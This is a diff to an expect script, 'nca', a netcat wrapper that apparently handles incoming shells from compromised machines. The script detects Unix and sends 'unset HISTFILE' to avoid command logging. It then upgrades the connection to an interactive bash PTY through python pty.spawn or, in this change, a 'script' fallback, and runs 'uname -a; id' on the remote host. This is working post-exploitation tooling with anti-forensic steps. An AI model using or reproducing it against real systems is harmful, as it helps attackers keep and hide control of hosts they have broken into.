@@ -1,5 +1,5 @@
 #!/usr/bin/expect
-# nca - nc wrapper by SNADO team
+# nca - nc wrapper by Donkeys team
 # Requires: expect, nc and optionally tmux
 
 set LISTEN false
@@ -66,7 +66,7 @@ if { $PORT > 0 && ($LISTEN == true || $ADDR != "0.0.0.0") } {
 			
 			send "echo 'un''ix'\n"
 			#sleep 0.2
-			sleep 0.5
+			sleep 1.5
 			expect {
 				"unix" {
 					puts "\[\033\[92m+\033\[0m\] Unix detected"
@@ -107,12 +107,20 @@ if { $PORT > 0 && ($LISTEN == true || $ADDR != "0.0.0.0") } {
 				}
 			}
 			send "unset HISTFILE\n"
-			send "p=`which python python2 python3 python2.7 python3.5 python2.6 python3.4 python3.6 | xargs | cut -d ' ' -f 1`;if \[ ! -z \$p \]; then echo 'P''YTHON-OK'; \$p -c 'import pty;pty.spawn(\"/bin/bash\")'; else echo 'P''YTHON-ERR'; fi\n"
+			send "p=`which python python2 python3 python2.7 python3.5 python2.6 python3.4 python3.6 | xargs | cut -d ' ' -f 1`;if \[ ! -z \$p \]; then echo 'P''TY-OK'; \$p -c 'import pty;pty.spawn(\"/bin/bash\")'; else p=`which script | xargs | cut -d ' ' -f 1`;if \[ ! -z \$p \]; then echo 'P''TY-OK'; \$p -qc /bin/bash /dev/null; else echo 'P''TY-ERR'; fi; fi;\n"
 			expect {
-				"PYTHON-OK" {
+				"PTY-OK" {
 					set ROWS [exec tput lines]
 					set COLS [exec tput cols]
-					puts "\[\033\[92m+\033\[0m\] python found"
+					puts "\[\033\[92m+\033\[0m\] Spawning pty"
+					expect {
+						"$ " {
+						}
+						"# " {
+						}
+						"% " {
+						}
+					}
 					send \x1A
 					puts "\[\033\[94m*\033\[0m\] Setting terminal"
 					expect ":"
@@ -156,8 +164,8 @@ if { $PORT > 0 && ($LISTEN == true || $ADDR != "0.0.0.0") } {
 					interact -o "\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\n" return
 					
 				}
-				"PYTHON-ERR" {
-					puts "\[\033\[91m-\033\[0m\] python not found"
+				"PTY-ERR" {
+					puts "\[\033\[91m-\033\[0m\] Can't spawn pty"
 					puts "\[\033\[92m+\033\[0m\] Interacting"
 					send "uname -a; id\n"
 					interact -o "\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3" return
